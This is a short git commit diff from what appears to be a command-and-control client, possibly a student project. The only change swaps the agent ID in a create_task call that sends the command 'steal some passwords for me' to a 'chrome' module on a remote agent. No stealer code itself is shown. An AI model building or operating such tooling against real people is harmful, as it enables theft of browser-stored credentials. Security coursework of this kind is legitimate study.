1a5ef5a39520386009780fba949034bd0a3eedbf
Waynel65 <waynel@bu.edu>
2022-05-03 20:48:28 -0400

    set fixed password for agent

--- client/client.py
+++ client/client.py
@@ -67,4 +67,4 @@ def create_task(command_type, cmd, agent_id):
 
 if __name__ == "__main__":
     # register(key, client_id, password)
-    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="8fb5de15fd79310d82eebedcf8ccf757")
+    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="417edea396132c357c1ce381b5738ddd")
